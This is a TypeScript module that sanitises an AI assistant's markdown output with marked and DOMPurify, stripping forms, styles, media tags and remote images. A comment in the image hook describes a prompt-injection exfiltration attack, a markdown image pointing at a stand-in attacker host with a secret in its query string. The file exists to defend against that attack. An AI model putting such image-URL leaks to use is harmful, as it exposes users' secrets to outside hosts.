/**
 * Assistant markdown → sanitised HTML. marked renders, DOMPurify strips
 * anything executable; external links open in a new tab.
 */

import createDOMPurify, { type DOMPurify, type WindowLike } from "dompurify";
import { marked } from "marked";

// Created on first use against the live window (tests install a DOM after import).
let purifier: DOMPurify | null = null;

function getPurifier(): DOMPurify | null {
  if (purifier) return purifier;
  if (typeof window === "undefined") return null;
  const p = createDOMPurify(window as unknown as WindowLike);
  if (!p.isSupported) return null;
  p.addHook("afterSanitizeAttributes", (node) => {
    if (node.tagName === "A" && /^https?:/i.test(node.getAttribute("href") ?? "")) {
      node.setAttribute("target", "_blank");
      node.setAttribute("rel", "noopener noreferrer");
    }
    // A remote image loads without a click, so a prompt-injected reply could
    // leak data in its URL (![](https://attacker/?d=<secret>)). Only local
    // images render; remote ones become a link the user has to follow.
    if (node.tagName === "IMG") {
      node.removeAttribute("srcset");
      const src = node.getAttribute("src") ?? "";
      if (!isLocalSource(src)) {
        const link = node.ownerDocument.createElement("a");
        link.textContent = `[image: ${node.getAttribute("alt") || src}]`;
        if (/^https?:/i.test(src)) {
          link.setAttribute("href", src);
          link.setAttribute("target", "_blank");
          link.setAttribute("rel", "noopener noreferrer");
        }
        node.replaceWith(link);
      }
    }
  });
  purifier = p;
  return p;
}

/** Same-origin path, or inline data/blob — never a request to another host. */
function isLocalSource(src: string): boolean {
  return (src.startsWith("/") && !src.startsWith("//")) || /^(data:image\/|blob:)/i.test(src);
}

// Forms and inline styles are harmless to script but let a reply fake UI (phishing overlays, fake buttons).
// Media elements are dropped for the same reason as remote images: they fetch on render.
const SANITIZE = {
  FORBID_TAGS: ["style", "form", "button", "textarea", "select", "option", "video", "audio", "source", "track", "picture"],
  FORBID_ATTR: ["style", "srcset", "poster", "background"],
};

const escapeHtml = (s: string) => s.replace(/[&<>"']/g, (c) => `&#${c.charCodeAt(0)};`);

export function renderMarkdown(text: string): string {
  const p = getPurifier();
  // Without a working sanitizer, show the source as plain text rather than unsanitised HTML.
  if (!p) return `<p>${escapeHtml(text).replace(/\n/g, "<br>")}</p>`;
  const html = marked.parse(text, { gfm: true, breaks: true, async: false }) as string;
  return p.sanitize(html, SANITIZE);
}
